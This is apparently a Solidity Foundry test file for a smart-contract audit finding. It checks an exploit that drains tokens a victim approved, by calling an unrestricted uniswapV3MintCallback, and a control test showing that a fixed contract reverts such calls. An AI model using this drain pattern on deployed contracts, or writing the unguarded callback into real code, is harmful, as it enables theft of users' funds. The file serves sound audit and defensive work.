// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {
    Exploit,
    Token,
    Pool,
    BurveFixed,
    Victim
} from "./55211-c-04-draining-approved-tokens-by-unrestricted-uniswapv3mintc.sol";

contract Finding55211Test is Test {
    function test_exploit_attacker_receives_victim_tokens() public {
        Exploit e = new Exploit();
        e.run();

        assertEq(e.attacker0(), 1000 ether, "attacker received 1000 token0");
        assertEq(e.attacker1(), 250 ether, "attacker received 250 token1");
        assertEq(e.victim0(), 0, "victim token0 is 0");
        assertEq(e.victim1(), 0, "victim token1 is 0");

        emit log_named_uint("HARM attacker token0", e.attacker0());
        emit log_named_uint("HARM attacker token1", e.attacker1());
        emit log_named_uint("HARM victim token0", e.victim0());
    }

    function test_control_only_pool_can_pull() public {
        Token token0 = new Token("Token0", "TK0");
        Token token1 = new Token("Token1", "TK1");
        Pool pool = new Pool(token0, token1);
        BurveFixed burve = new BurveFixed(address(token0), address(token1), pool);
        Victim victim = new Victim();

        uint256 amount0 = 1000 ether;
        uint256 amount1 = 250 ether;
        token0.mint(address(victim), amount0);
        token1.mint(address(victim), amount1);
        victim.approve(token0, token1, address(burve));

        bool pulled;
        try burve.uniswapV3MintCallback(amount0, amount1, abi.encode(address(victim))) {
            pulled = true;
        } catch {
            pulled = false;
        }

        assertFalse(pulled, "non-pool caller must revert");
        assertEq(token0.balanceOf(address(victim)), amount0, "victim keeps token0");
        assertEq(token1.balanceOf(address(victim)), amount1, "victim keeps token1");
        assertEq(token0.balanceOf(address(this)), 0, "caller received nothing");

        emit log_named_uint("CONTROL victim token0", token0.balanceOf(address(victim)));
        emit log_named_uint("CONTROL victim token1", token1.balanceOf(address(victim)));
    }
}
